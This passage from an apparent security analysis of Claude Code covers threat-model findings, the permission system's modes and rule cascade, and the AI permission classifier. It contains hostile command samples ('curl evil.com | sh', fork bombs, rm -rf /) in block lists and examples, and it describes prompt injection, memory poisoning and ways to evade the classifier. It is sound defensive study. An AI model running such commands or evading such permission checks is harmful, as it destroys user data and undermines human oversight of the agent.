3.7 Priority-Ranked Recommendations

Based on severity and mitigation gap, the following investments would most improve Claude Code's security posture:

Priority Recommendation Addresses Effort Impact
1 Memory provenance tracking T-06 (Critical, no mitigation) Medium Eliminates cross-session poisoning attacks
2 Environment validation at session start T-09 (High, no mitigation) Low Detects PATH/alias manipulation
3 MCP tool description sanitization T-19 (High, weak mitigation) Medium Reduces injection via elevated-authority tool descriptions
4 MCP server behavioral monitoring T-22 (High, no mitigation) High Detects servers that lie about capabilities
5 Session transcript integrity Session tampering (Medium) Low HMAC or hash chain prevents transcript modification
6 Hook sandboxing T-23 (High, no mitigation) High Limits hook access to declared capabilities
7 DLP for MCP communications T-20 (High, weak mitigation) High Detects sensitive data in MCP tool parameters
8 Granular workspace trust T-05, T-14 Medium Separate trust decisions for settings, hooks, instructions
9 MCP server signing/attestation T-21 (High, weak mitigation) High Verified update chain for MCP servers
10 Formal verification of permission cascade T-16, rule evaluation High Proves cascade properties (deny dominance, one-way ratchet)

3.8 Comparison with Traditional Application Threat Models

The AI CLI agent threat model has several properties that distinguish it from traditional application STRIDE analyses:

Property Traditional App AI CLI Agent
Attack input Structured (HTTP, SQL, API) Unstructured (natural language, arbitrary files)
Spoofing mechanism Credential theft, session hijacking Prompt injection (content impersonates instructions)
Tampering target Database records, session state LLM context, memory, configuration
Information channels Database queries, API responses File reads, API calls, terminal output, MCP, telemetry
DoS vectors Network flooding, resource exhaustion Context window exhaustion, API rate limits, fork bombs
Privilege escalation Auth bypass, RBAC flaws Permission system bypass, trust domain confusion
Repudiation Missing audit logs Opaque AI reasoning, unattributable tool calls
Defense maturity Decades of research, proven defenses Nascent field, probabilistic defenses for core threats

The most significant difference is that the core spoofing and elevation threats (prompt injection) have no deterministic defense. In traditional applications, authentication and authorization are well-solved problems. In AI agents, the equivalent problem --- ensuring that the agent follows the user's instructions and not an attacker's --- remains fundamentally unsolved. This does not mean the system is insecure, but it means the security model must be honest about its probabilistic nature and design for containment rather than prevention.

Security Assessment

Strengths

  • Defense-in-depth architecture aligns with STRIDE findings. The four-layer enforcement model (content ingestion, instruction processing, action authorization, execution containment) addresses threats across all six STRIDE categories. No single STRIDE category is undefended.
  • Anti-DoS defenses are comprehensive. Token budgets, turn limits, timeouts, and cost tracking cover all identified denial-of-service vectors.
  • Enterprise privilege model is sound. The managed settings, one-way ratchet, and bypass-immune checks create a principled privilege hierarchy that prevents lower trust levels from escaping their boundaries.
  • Bash security pipeline addresses the highest-risk component. The 4,400-line parser with AST analysis, pattern matching, and sandbox enforcement represents a serious investment in the component with the largest blast radius.

Weaknesses

  • Six critical threats lack deterministic defense. Prompt injection (T-01, T-08), command injection via encoding (T-02), file edit backdoors (T-03), MCP result poisoning (T-04), malicious hooks (T-05), and memory poisoning (T-06) are all critical and have only partial or no mitigations.
  • Memory system is the most exposed component. T-06 is the only critical threat with zero mitigation. Memory poisoning enables cross-session attacks that persist indefinitely.
  • MCP security model has four distinct gaps. Tool description injection (T-19), exfiltration channel (T-20), supply chain (T-21), and capability lying (T-22) represent a cluster of related vulnerabilities in the extensibility system.
  • Repudiation defenses are the weakest category. Audit logging and decision tracing exist but may not be enabled by default. When things go wrong, forensic analysis is harder than it should be.
  • Environment inheritance is an unaddressed attack vector. T-09 (PATH/alias manipulation) is a high-severity threat with no mitigation. This is particularly concerning for CI/CD deployments where the environment is attacker-influenced.

Recommendations

  1. Treat memory poisoning (T-06) as the highest-priority security investment. Implement provenance tracking, trust-level annotations, and integrity verification for the memory system. This is the only critical threat with zero mitigation.
  2. Develop an MCP security hardening roadmap. The four MCP-related gaps (T-19, T-20, T-21, T-22) should be addressed as a cohesive initiative: tool description sanitization, DLP for MCP communications, server signing, and capability verification.
  3. Enable audit logging by default. The repudiation threat category is under-defended primarily because logging is optional. Making comprehensive logging the default (with opt-out for performance-sensitive environments) would significantly improve incident response capabilities.
  4. Implement environment validation. A session-start check that validates PATH, verifies critical binary locations, and flags known-dangerous environment variables (LD_PRELOAD, DYLD_INSERT_LIBRARIES) addresses T-09 at low cost.
  5. Invest in formal verification. The permission cascade (8 sources, deny > ask > allow, one-way ratchet) is complex enough that property-based testing or formal verification would provide stronger assurance than manual code review. Correctness bugs in the cascade have high-severity consequences because they affect every tool call.

Chapter 4: Permission System Deep Dive

Every tool call an AI CLI agent makes passes through a single gate: the permission system. This is not a feature bolted onto the side of the architecture --- it is the load-bearing wall between an AI model's intentions and the user's filesystem, shell, and network. Claude Code implements a permission architecture with six operating modes, eight rule sources arranged in a strict priority hierarchy, and a deny-beats-ask-beats-allow evaluation chain with first-match semantics. This chapter forensically analyzes each component: the design rationale, the implementation mechanics, the rule grammar, and the security implications of every design choice.

4.1 Architecture of the Permission Gate

Every tool invocation --- whether the model wants to read a file, write code, execute a shell command, or call an MCP tool --- routes through the same permission evaluation pipeline before execution. The pipeline is deterministic for static rules and probabilistic only when the AI classifier is engaged (Chapter 5).

flowchart TD
    TC["Tool Call from Model"] --> HB{"Hardcoded<br/>Block List?"}
    HB -->|Yes| DENY1["DENY<br/>(immutable, non-configurable)"]
    HB -->|No| MODE{"Check Permission<br/>Mode"}

    MODE -->|bypass| ALLOW1["ALLOW<br/>(all operations)"]
    MODE -->|deny-all| DENY2["DENY<br/>(all operations)"]
    MODE -->|plan| PLAN{"Read-only<br/>tool?"}
    PLAN -->|Yes| ALLOW2["ALLOW"]
    PLAN -->|No| DENY3["DENY"]

    MODE -->|default / auto / custom| CASCADE["Rule Cascade<br/>8 Sources"]

    CASCADE --> D{"DENY rules<br/>match?"}
    D -->|Yes| DENY4["DENY"]
    D -->|No| A{"ASK rules<br/>match?"}
    A -->|Yes| ASK["ASK user<br/>(or classifier)"]
    A -->|No| AL{"ALLOW rules<br/>match?"}
    AL -->|Yes| ALLOW3["ALLOW"]
    AL -->|No| DEFAULT["Default for<br/>tool type"]

The hardcoded block list sits above the mode check. This is deliberate: certain operations --- rm -rf /, fork bombs, curl | sh piped to a shell interpreter --- are blocked regardless of mode, user configuration, or enterprise policy. These represent catastrophic-damage commands that no legitimate AI agent workflow requires. They are the bypass-immune floor.

The critical security property: the hardcoded block list cannot be disabled by any configuration source. Not by enterprise policy. Not by settings.local.json. Not by bypass mode. This is the one layer that survives even a complete compromise of the configuration system (CWE-284: Improper Access Control).

4.2 The Six Permission Modes

Claude Code provides six permission modes arranged on a spectrum from maximum restriction to maximum autonomy. Each mode represents a different answer to the question: "When the AI wants to do something risky, what happens?"

Mode Reads Writes Shell Decision Maker Use Case
deny-all Blocked Blocked Blocked Nobody (all denied) Security audit, compliance review
plan Allowed Blocked until plan approved Blocked until approved User (post-plan) Architecture analysis, code review
default Allowed Ask user Ask user User (per-action) Conservative development
auto Allowed AI classifier decides AI classifier decides AI classifier Productive development
custom Per-rule Per-rule Per-rule Rules + user Enterprise deployments
bypass Allowed Allowed Allowed Nobody (all allowed) Sandboxed CI/CD, containers

deny-all Mode

Deny-all blocks everything, including reads. Its purpose is not usability --- it is auditability. When the agent runs in deny-all mode, it proposes tool calls, receives denial responses, and adapts. Security auditors can observe the agent's complete decision tree without any actual execution.

Security implication: Deny-all mode reveals what the agent would do if granted permission. This is valuable for threat modeling (Chapter 3) but also reveals the agent's attack surface to an observer. In a shared-screen environment, deny-all mode could expose internal reasoning that the user might not want visible.

plan Mode

Plan mode creates a two-phase workflow: explore (reads allowed), then execute (writes require approval). The agent can read files, search codebases, and analyze architecture. But file writes, shell commands, and destructive operations are blocked until the user reviews and approves a plan.

Security implication: The plan-to-execution transition is a single binary gate. Once approved, the execution phase behavior depends on what the mode transitions to (typically default or auto). A malicious prompt injection that executes during the exploration phase cannot modify files, but it can read sensitive data and include it in the plan output. The read-is-safe assumption baked into plan mode does not hold when file contents include secrets (CWE-200: Exposure of Sensitive Information).

default Mode

Default mode is the workhorse. Read operations proceed silently. Write operations and shell commands prompt the user. The user approves or denies each action individually.

The session memory cache (Section 4.5) transforms default mode from unusable to practical. When the user approves Bash(git diff *), the system generalizes and caches the pattern. Subsequent git diff variants auto-approve without prompting.

Security implication: Session memory creates a progressive trust accumulation. Early in a session, the user is attentive and evaluates each prompt. Late in a session, accumulated approvals may auto-approve operations the user would not have approved if asked fresh. This is the session drift problem --- the security posture at minute 90 is weaker than at minute 1.

auto Mode

Auto mode replaces the user prompt with an AI classifier (Chapter 5). The classifier evaluates each tool call against the current context and returns allow, deny, or soft-deny. The user is not interrupted for routine operations.

Security implication: The AI classifier introduces probabilistic behavior into the permission system. Two identical commands in two identical sessions may receive different verdicts due to model temperature. This is acceptable only because the classifier operates on top of the deterministic rule cascade --- the hard security boundaries (deny lists, blocked patterns) are never bypassed by the classifier. The classifier is a UX optimization, not a security boundary.

custom Mode

Custom mode evaluates user-defined rule sets: allow specific commands, deny specific paths, ask for everything else. This is the enterprise escape hatch.

Security implication: Custom rules inherit the full complexity of the rule grammar (Section 4.4). Misconfigured rules can create gaps. Bash(git *) allows git push --force main alongside git log. The user must understand glob semantics to write safe rules. This is the classic policy-complexity problem (CWE-863: Incorrect Authorization).

bypass Mode

Bypass mode auto-approves everything. It exists for sandboxed environments --- CI/CD containers, ephemeral VMs, disposable filesystems --- where the blast radius is contained by external controls.

Security implication: Bypass mode should never be active on a developer's workstation with a real home directory. The implementation gates bypass activation behind a --dangerously-bypass-permissions flag that is intentionally verbose. But no runtime check verifies that the environment is actually sandboxed. A user who passes the flag on their workstation gets bypass mode on their production filesystem. The flag's length is the only defense --- there is no enforcement of the containment assumption (CWE-269: Improper Privilege Management).

4.3 The Eight Rule Sources

Rules come from eight sources, arranged in strict priority order. Higher-priority sources dominate lower-priority sources. Within each source, deny rules are checked before ask rules, which are checked before allow rules.

graph TD
    subgraph "Priority Hierarchy (Highest → Lowest)"
        S1["1. Policy (MDM/Enterprise)"] --> S2["2. Managed (Org Settings)"]
        S2 --> S3["3. User (~/.config/claude/settings.json)"]
        S3 --> S4["4. Project (.claude/settings.json)"]
        S4 --> S5["5. Local (.claude/settings.local.json)"]
        S5 --> S6["6. Plugin (Extension Manifests)"]
        S6 --> S7["7. Hook (Runtime Decisions)"]
        S7 --> S8["8. Built-in (Hardcoded Defaults)"]
    end

    S1 -.- N1["Cannot be overridden by anything"]
    S4 -.- N4["Comes from version control —<br/>requires user trust approval"]
    S5 -.- N5["Gitignored — developer overrides"]
    S8 -.- N8["Safety floor — reads auto-allow,<br/>writes ask, destructive deny"]

Source 1: Policy (MDM/Enterprise)

Delivered via macOS configuration profiles, Windows Group Policy, or Linux-managed config files. These rules are set by enterprise administrators and cannot be overridden by any other source. Not by the user. Not by the project. Not by local settings.

Security assessment: Policy rules represent the compliance hammer. When they work, they enforce organizational security boundaries absolutely. The weakness is enforcement verification: how does the system confirm that a policy file was genuinely delivered by MDM and not placed by a malicious actor with write access to the config directory? The current implementation trusts the filesystem path. If an attacker can write to the policy config directory, they can inject policy rules (CWE-427: Uncontrolled Search Path Element).

Source 2: Managed Settings

Organization-level settings pushed from a centralized management server. Less forceful than policy --- managed settings establish defaults that individual users can tighten but not loosen.

Security assessment: The one-way ratchet --- tighten but not loosen --- is the critical property. A managed deny rule cannot be overridden by user allow rules. But a managed allow rule can be overridden by user deny rules. This asymmetry is correct: organizations set the security floor, users raise it.

The allowManagedPermissionRulesOnly: true flag disables all non-managed permission rules. This is the nuclear option for high-security environments. When active, user rules, project rules, and local rules are all ignored.

Source 3: User Settings

Per-user settings stored in ~/.config/claude/settings.json. These travel with the user across projects.

Security assessment: User settings are as secure as the user's home directory. On a multi-user system, another user with read access to the settings file can observe the permission policy. On a single-user system, the threat is malware with write access modifying user settings to weaken the security posture.

Source 4: Project Settings

Per-project settings committed to version control at .claude/settings.json. Every contributor shares these rules.

Security assessment: This is the most dangerous source because it comes from other people. A malicious contributor can commit settings that allow: ["Bash(*)"], granting the agent unrestricted shell access. The defense is the project approval gate: project-sourced rules require explicit user confirmation before taking effect. The confirmation is stored in user settings (Source 3), so a malicious project cannot approve itself.

The approval gate checks a hash of the project settings. If the settings change (a contributor modifies the committed file), the user is re-prompted. This is correct but creates a usability burden in active repositories where settings change frequently.

Residual risk: The approval gate presents the settings content for user review. But users presented with a wall of JSON after cloning a repository are likely to approve without careful reading. This is the "click OK" problem that plagues every confirmation dialog (CWE-356: UI Misrepresentation of Critical Information).

Source 5: Local Settings

Per-project settings that are gitignored (.claude/settings.local.json). Developer overrides that do not affect the team.

Security assessment: Local settings are the common escape hatch for developers who find project settings too restrictive. A Bash(*) rule in local settings grants unrestricted shell access. Since the file is local and gitignored, there is no team review. The security posture of the system now depends entirely on one developer's settings hygiene.

Source 6: Plugin Rules

Permissions bundled with installed plugins or extensions.

Security assessment: Plugins can only add allow rules, not deny rules. Plugin allow rules have lower priority than user, project, or local deny rules. Plugin tools are namespaced (mcp__plugin_name__tool_name) so rules can target them specifically. These constraints limit the blast radius of a malicious plugin, but a plugin that requests Bash(*) still gets full shell access unless blocked by a higher-priority deny rule.

Source 7: Hook Decisions

Runtime permission decisions from hook scripts. Hooks fire before tool execution and can allow, deny, or modify the permission decision via exit codes and structured JSON output.

Security assessment: Hooks are executable code. A PreToolUse hook that returns exit code 2 blocks execution. A hook that returns updatedInput can rewrite tool arguments before execution. This makes hooks both powerful and dangerous: a compromised hook can silently rewrite commands. The mitigation is allowManagedHooksOnly: true, which restricts hooks to those defined in managed settings.

Critical invariant: A hook's allow decision with updatedInput does NOT bypass settings.json deny rules. The modified input is re-evaluated against the rule cascade. This prevents hooks from smuggling dangerous commands past the permission system.

Source 8: Built-in Defaults

Hardcoded defaults: read-only tools auto-allow, write tools ask, known dangerous patterns deny.

Security assessment: The safety floor. Even with zero configuration, the system behaves safely. The weakness is that "known dangerous patterns" is a finite list. Novel attack vectors not in the list pass through to the default ask/allow behavior.

4.4 The Rule Grammar

Permission rules use a Tool(pattern) grammar with glob-based pattern matching. This is a deliberate UX choice: developers know globs from .gitignore and shell expansion. The grammar is simpler than a full policy language (Rego, Cedar, OPA) but expressive enough for 95% of use cases.

Syntax

Rule     := ToolName "(" Pattern ")"
ToolName := "Bash" | "Read" | "Write" | "Edit" | "Glob" | "Grep" 
          | "WebFetch" | "WebSearch" | "NotebookEdit" 
          | "mcp__" ServerName "__" ToolName
Pattern  := GlobExpression

Examples:

{
  "permissions": {
    "allow": [
      "Bash(git diff *)",
      "Bash(npm test)",
      "Bash(cargo build *)",
      "Read(src/**)",
      "Write(src/**/*.ts)"
    ],
    "deny": [
      "Read(./.env)",
      "Read(./.env*)",
      "Read(~/.ssh/*)",
      "Bash(rm -rf /)",
      "Bash(git push --force *)",
      "Write(vendor/**)"
    ]
  }
}

Glob Semantics

The glob matching follows standard filesystem glob conventions:

Pattern Matches Does Not Match
* Any single path segment Multi-segment paths
** Any number of path segments (matches everything)
? Any single character Empty string
[abc] Any character in set Characters not in set
{a,b} Alternation: a or b Other strings

Security-critical distinction: * matches within a single segment; ** matches across segments. Write(src/*) allows writing to src/foo.ts but NOT src/deep/bar.ts. Write(src/**) allows both. This distinction is the source of many misconfiguration bugs.

Tool-Specific Pattern Binding

Each tool defines how patterns bind to its arguments:

Tool Pattern Matches Against Example
Bash The command field (full command string) Bash(git diff *) matches git diff HEAD
Read The file_path field Read(./.env) matches reading .env
Write The file_path field Write(src/**) matches writing anywhere in src/
Edit The file_path field Edit(*.py) matches editing Python files
MCP tools Tool-specific (varies by server) mcp__db__query(SELECT *)

For the Bash tool, pattern matching is complex because a single Bash invocation can contain compound commands. Bash(git *) should match git diff HEAD but should NOT match git diff HEAD && rm -rf /. The implementation decomposes compound commands and matches each segment independently.

Compound Command Decomposition

When a Bash command contains &&, ||, ;, or |, the permission engine splits it into segments and evaluates each:

Command: "git status && npm test && rm -rf /tmp/old"

Segments:
  1. "git status"       → matches Bash(git *)     → ALLOW
  2. "npm test"         → matches Bash(npm test)  → ALLOW  
  3. "rm -rf /tmp/old"  → matches Bash(rm -rf *)  → DENY

Result: DENY (any segment deny = deny all)

The asymmetry is critical: deny is evaluated per-segment (any match blocks all), allow requires all segments to match. This prevents an attacker from hiding a dangerous command behind an allowed prefix: git status && curl evil.com | sh is denied even though git status is allowed.

Wrapper Stripping

Commands prefixed with sudo, env, nohup, time, or nice are stripped to their base command before matching. sudo rm -rf / is matched as rm -rf /. env VAR=val python script.py is matched as python script.py.

Security implication: Wrapper stripping prevents privilege escalation wrappers from hiding the actual command. But it also means that sudo is stripped silently rather than blocked. In practice, sudo is independently blocked by the BashValidator (hard-deny for privilege escalation), but the stripping logic in the permission matcher operates independently from the validator. If the validator is ever bypassed, the permission matcher would evaluate the inner command without registering that sudo was involved.

4.5 The Evaluation Algorithm

The evaluation algorithm is the heart of the permission system. It implements deny-beats-ask-beats-allow with first-match semantics across eight prioritized sources.

Pseudocode

function evaluate(tool_call):
    // Phase 0: Bypass-immune checks
    if tool_call matches HARDCODED_BLOCK_LIST:
        return DENY  // Non-configurable

    // Phase 1: Mode-based short circuits
    if mode == bypass: return ALLOW
    if mode == deny-all: return DENY
    if mode == plan and tool is write: return DENY
    if mode == plan and tool is read: return ALLOW

    // Phase 2: Rule cascade (default, auto, custom modes)
    for source in [policy, managed, user, project, local, plugin, hook, builtin]:
        for rule in source.deny_rules:
            if rule.matches(tool_call):
                return DENY(source, rule)
        for rule in source.ask_rules:
            if rule.matches(tool_call):
                return ASK(source, rule)
        for rule in source.allow_rules:
            if rule.matches(tool_call):
                return ALLOW(source, rule)

    // Phase 3: No rule matched — apply default
    if tool.readOnlyHint:
        return ALLOW  // Reads are safe by default
    else:
        return ASK    // Writes prompt the user

Why First-Match-Wins

The evaluation uses first-match-wins within the priority hierarchy, not most-specific-wins. This is a deliberate departure from systems like CSS specificity or firewall rule ordering.

Most-specific-wins creates emergent behavior that is hard to debug. Consider:

Source 4 (project): allow Write(**)          # allow writing anywhere
Source 4 (project): deny  Write(vendor/**)   # except vendor
Source 5 (local):   allow Write(vendor/patches/**)  # but allow vendor patches

With most-specific-wins, the specificity of vendor/patches/** vs. vendor/** vs. ** determines the outcome, and that ranking depends on the specificity algorithm's implementation. Different algorithms (longest prefix, deepest glob, most literal characters) produce different results.

With first-match-wins and source priority, the behavior is mechanical: Source 4's deny for vendor/** fires before Source 5's allow for vendor/patches/** because Source 4 has higher priority. The result is always DENY, regardless of specificity. To allow vendor/patches/**, the allow rule must be placed at Source 4 or higher.

Security implication: First-match-wins is more restrictive but more predictable. A deny rule at a high-priority source cannot be overridden by any lower-priority source. This makes the system easier to audit: you scan sources top-down and the first matching rule is the decision. There is exactly one rule responsible for every decision.

The Decision Trace

Every permission decision produces a trace for debugging:

Permission decision for: Bash("docker build -t myapp .")

Source     | Rules Checked              | Match?
-----------|---------------------------|--------
policy     | (none)                    | -
managed    | (none)                    | -
user       | deny: Bash(docker rm *)   | No match
           | allow: Bash(docker build *)| MATCH → ALLOW
project    | (not reached)             | -
...

Decision: ALLOW (source: user, rule: "Bash(docker build *)")

This trace is accessible via --permission-debug and is essential for diagnosing unexpected denials. Without it, permission debugging degenerates into trial and error.

4.5 Session Memory and Progressive Trust

The session memory cache transforms the permission system from theoretically correct but practically unusable into something developers actually tolerate.

How Session Memory Works

When the user approves a tool call in default mode, the system extracts a pattern from the approved command and caches the approval:

User approves: Bash("git diff --cached")
System caches: Bash(git diff *) → ALLOW

User approves: Write("src/components/Button.tsx")
System caches: Write(src/**) → ALLOW  (generalized from specific path)

Pattern generalization is risk-aware. Read-only commands generalize broadly (git diff --cached → git *), because all git-read operations have similar risk profiles. Write commands generalize narrowly (src/components/Button.tsx → src/**), because write targets vary dramatically in risk.

Cache Properties

Property Behavior Rationale
Scope Session-only A session compromise cannot permanently weaken permissions
Persistence Resets on session end, /clear, mode change Clean slate per session
Generalization Risk-aware pattern widening Balance usability with precision
Override Cannot override deny rules Deny is absolute regardless of cache

The Progressive Trust Problem

Session memory creates a progressive trust accumulation. As the session continues, more patterns are cached, fewer prompts appear, and the effective security posture weakens. At minute 1, the user evaluates every action. At minute 90, most actions auto-approve through cache hits.

This is by design --- it aligns prompt frequency with user attention. But it creates a vulnerability window: if the model's behavior changes late in a session (due to context poisoning, prompt injection, or model drift), the accumulated cache may auto-approve operations the user would reject if prompted fresh.

Mitigations: 1. Risk-based cache bypass. High-risk operations (flagged by the command classifier as Destructive) always prompt, regardless of cache. 2. Cache TTL. Cache entries can optionally expire after N minutes of inactivity, forcing re-approval for patterns not recently used. 3. Anomaly detection. Operations that differ significantly from the session's established patterns trigger fresh prompts even when the pattern technically matches a cached rule.

4.6 Subagent Permission Scoping

When the main agent spawns a subagent, the subagent's permissions are strictly scoped. Two principles govern this:

No privilege escalation. A subagent cannot have more permissions than its parent. If the parent runs in default mode, the subagent cannot run in bypass mode. If the parent denies Write(.env), the subagent inherits that denial.

Clean permission slate. Session-memory approvals from the parent do not transfer to the subagent. Each subagent starts with only the permissions explicitly granted in its agent definition. The rationale: session memory represents the user's trust in the parent agent's judgment. That trust does not automatically extend to subagents with different system prompts and behavioral tendencies.

flowchart TD
    Parent["Parent Agent<br/>mode: auto<br/>cache: [git *, npm test]"] --> Sub1["Subagent 1<br/>tools: Read, Grep<br/>cache: empty"]
    Parent --> Sub2["Subagent 2<br/>tools: Read, Bash<br/>cache: empty"]

    Sub1 -.- N1["Cannot access Write, Bash<br/>Must re-earn cache"]
    Sub2 -.- N2["Bash available but<br/>no cached approvals"]

    style Parent fill:#2266cc,color:#fff
    style Sub1 fill:#44aa22,color:#fff
    style Sub2 fill:#cc6622,color:#fff

Security implication: Subagent permission scoping is the primary defense against confused deputy attacks in multi-agent architectures. A malicious MCP tool result that tricks the parent into spawning a subagent cannot leverage the parent's accumulated trust.

4.7 The Bypass-Immune Layer

Certain protections remain active even in bypass mode. These constitute the absolute security floor:

Protection What It Guards Mode Override?
Hardcoded block list rm -rf /, fork bombs, curl \| sh No --- active in all modes
.git/ directory write protection Repository integrity No
.claude/ write protection Agent configuration integrity No
Shell config file protection .bashrc, .zshrc, .profile No
sudo / privilege escalation block Root access prevention No

These bypass-immune checks execute before the mode is consulted. Even a settings.json with "permissions": {"allow": ["Bash(*)"]} cannot override them. They are the final defense against configuration errors, compromised settings files, and overly permissive policies.

Residual risk: The bypass-immune layer protects known critical paths. It does not protect unknown critical paths. A user's ~/.aws/credentials is not in the bypass-immune list (it may be covered by a deny rule, but deny rules are configurable). If all deny rules are removed, AWS credentials become readable. The bypass-immune layer only covers the hardcoded set.

4.8 Permission System Attack Surface

The permission system itself is an attack target. Every component introduces its own vulnerability surface:

Component Attack Vector CWE
Rule cascade Priority confusion leading to unintended allow CWE-863
Glob matching Overly broad patterns granting excessive access CWE-285
Project settings Malicious .claude/settings.json in cloned repo CWE-15
Session cache Progressive trust weakening over long sessions CWE-613
Wrapper stripping Incomplete stripping allowing command hiding CWE-78
Mode selection User choosing bypass on unsandboxed environment CWE-269
Pattern decomposition Incomplete splitting of compound commands CWE-77
Hook decisions Compromised hook allowing dangerous operations CWE-829

Chapter 6 provides detailed attack scenarios and mitigations for each vector.

Security Assessment

Strengths: - Deny-first evaluation with eight prioritized sources is architecturally sound. The first-match-wins semantics are predictable and auditable. - The bypass-immune layer provides a non-configurable safety floor that survives configuration compromise. - Subagent permission scoping implements least authority correctly, preventing privilege escalation across agent boundaries. - The decision trace makes every permission decision debuggable.

Weaknesses: - The project settings source (Source 4) is a supply-chain attack vector. The approval gate mitigates but does not eliminate the risk because users tend to approve without thorough review. - Session memory progressive trust creates a growing vulnerability window as sessions continue. The risk-based cache bypass only covers commands classified as Destructive --- commands classified as Write but actually dangerous can still benefit from cached approvals. - The glob grammar is powerful enough to create unintended permissions but not expressive enough to create precise policies. There is no way to express "allow git push only to non-protected branches" in glob syntax. - No formal verification of rule interactions. The system relies on testing and the decision trace for correctness validation. For complex multi-source configurations, emergent behavior is possible and difficult to predict. - Bypass mode has no runtime sandbox verification. The flag-length defense against accidental activation is insufficient for environments where scripts automate Claude Code invocation.

Research Gaps: - Formal policy verification: Can we prove that a given set of rules across eight sources never permits a specific operation? Tools like Alloy or TLA+ could model the rule cascade and check safety properties. - Contextual permission scoping: Rules that consider not just what tool is called but why --- linking permissions to the user's stated intent rather than the command's syntactic form. - Temporal permission decay: Automatic tightening of session-cached permissions as session duration increases, counteracting progressive trust accumulation. - Cross-session permission learning: Using historical approval patterns to suggest rule configurations that match the user's actual behavior, reducing both over-permission and prompt fatigue.

Chapter 5: The AI Permission Classifier

The most architecturally novel component in Claude Code's permission system is also its most controversial: an AI model that judges whether another AI model's actions are safe. Auto-mode delegates permission decisions to a classifier --- a secondary LLM that evaluates each tool call and returns allow, deny, or soft-deny. This chapter forensically examines the classifier's architecture, its three-tier evaluation pipeline, its input feature design, the training data problem, false positive/negative trade-offs, and the fundamental philosophical limitations of AI judging AI safety.

5.1 Why an AI Classifier Exists

The permission system described in Chapter 4 handles two ends of the spectrum well: clearly safe operations (reads, known-safe commands) auto-approve, and clearly dangerous operations (fork bombs, rm -rf /, curl | sh) hard-deny. The problem is the middle.

Consider these commands, all plausible in a coding session:

Command Safe? Why Ambiguous
rm -rf ./build Usually safe Deletes build output, but ./build could be anything
npm install lodash Usually safe Standard package install, but supply-chain risk exists
git push origin main Context-dependent Fine if you own the repo, catastrophic if it is shared
chmod 755 deploy.sh Usually safe Standard permission, but 777 would be dangerous
curl https://api.github.com/repos Usually safe Reading a public API, but what if the URL is malicious?

Static rules cannot handle these cases. Bash(rm -rf *) as a deny rule blocks all rm -rf commands, including the perfectly safe rm -rf ./build. Bash(rm -rf *) as an allow rule permits rm -rf /. The command's safety depends on context: what directory are we in? What did the user ask for? What has the agent been doing?

The AI classifier exists to provide context-aware evaluation for the ~5% of tool calls that are genuinely ambiguous. It is not a security boundary --- the deterministic rules handle that. It is a UX optimization that reduces unnecessary prompts while maintaining situational awareness that static rules lack.

5.2 The Three-Tier Classification Architecture

The classifier is not a single model call. It is a three-tier pipeline where each tier is more expensive and more capable than the last. The system short-circuits at the earliest tier that produces a high-confidence answer.

flowchart TD
    TC["Tool Call"] --> T1{"Tier 1:<br/>Deterministic<br/>Pattern Matching"}
    T1 -->|"Safe/Dangerous<br/>(definitive)"| D1["Decision"]
    T1 -->|"Ambiguous"| T2{"Tier 2:<br/>Heuristic<br/>Risk Scoring"}
    T2 -->|"High confidence<br/>(score > 0.85 or < 0.15)"| D2["Decision"]
    T2 -->|"Low confidence<br/>(0.15 ≤ score ≤ 0.85)"| T3{"Tier 3:<br/>LLM Classifier<br/>(Side-Query)"}
    T3 --> D3["Decision"]

    T1 -.- C1["Cost: ~$0<br/>Latency: <1ms<br/>Handles: ~70%"]
    T2 -.- C2["Cost: ~$0<br/>Latency: ~1ms<br/>Handles: ~25%"]
    T3 -.- C3["Cost: ~$0.003<br/>Latency: 100-300ms<br/>Handles: ~5%"]

Tier 1: Deterministic Pattern Matching

Tier 1 uses hardcoded lists of always-safe and always-dangerous commands. No computation, instant decisions.

Always-safe list (representative):

ls, cat, head, tail, wc, echo, pwd, date, whoami,
git status, git log, git diff, git show, git branch,
cargo check, cargo clippy, cargo test --no-run,
npm test, npm run lint, npx tsc --noEmit,
python -m pytest --collect-only, ruff check, mypy

Always-dangerous list (representative):

rm -rf /, dd if=/dev/zero of=/dev/sda,
:(){ :|:& };:, eval $(...),
curl ... | sh, wget ... | bash,
git push --force origin main,
chmod -R 777 /, mkfs.ext4

Security assessment: Tier 1 is deterministic and auditable. Its weakness is coverage --- the lists are finite. Novel commands not in either list fall through to Tier 2. An attacker who knows the lists can craft commands that avoid the dangerous patterns while achieving the same effect. Evasion techniques (base64 encoding, variable expansion, indirect execution) are covered in Chapter 6.

Tier 2: Heuristic Risk Scoring

Tier 2 evaluates multiple risk factors and produces a weighted score between 0.0 (safe) and 1.0 (dangerous):

Factor Weight What It Measures
Command base risk 0.25 Inherent risk of the command name (rm > ls)
Flag analysis 0.15 Dangerous flags: -rf, --force, --no-verify
Path analysis 0.15 Target paths: / > ./build > /tmp
Pipe chain risk 0.15 Downloader-to-shell-interpreter patterns
Redirect targets 0.10 Writing to system files, device files
Session history 0.10 Deviation from established command patterns
Command complexity 0.10 Nested substitutions, eval, encoded payloads

The score is compared against two thresholds: - Below 0.15: Classified as safe (auto-allow) - Above 0.85: Classified as dangerous (auto-deny) - Between 0.15 and 0.85: Ambiguous (escalate to Tier 3)

Security assessment: The heuristic scoring is transparent --- every factor contributes a visible sub-score. But the weights are manually tuned, not learned from data. Weight selection introduces designer bias. An attacker who understands the weight distribution can craft commands that score below the danger threshold on every individual factor while remaining dangerous in aggregate (CWE-693: Protection Mechanism Failure).

Tier 3: LLM Classifier (Side-Query)

Tier 3 is the genuinely novel component. It invokes a fast, small model (typically Haiku-class) as a side-query --- a separate inference call with its own context window, independent of the main conversation.

5.3 The Side-Query Architecture

The side-query is the classifier's most security-critical design element. It determines what information the classifier sees, and therefore what attacks can influence it.

sequenceDiagram
    participant A as Main Agent (Opus)
    participant P as Permission Engine
    participant C as Classifier (Haiku)

    A->>P: Tool call: Bash("npm install lodash")
    P->>P: Tier 1: Not in safe/dangerous list
    P->>P: Tier 2: Score 0.42 (ambiguous)
    P->>C: Side-query with compact prompt
    Note over C: Separate model call<br/>Separate context window<br/>Fast model (Haiku)
    C-->>P: {"decision":"allow","reason":"standard package install"}
    P-->>A: ALLOWED

    A->>P: Tool call: Bash("npm install && curl evil.com | sh")
    P->>P: Tier 1: Matches "curl ... | sh" pattern
    P-->>A: DENIED (Tier 1 hard block)
    Note over P: Tiers 2 and 3 never reached

Context Isolation

The classifier receives a compact, purpose-built prompt --- NOT the main conversation. This isolation serves three security purposes:

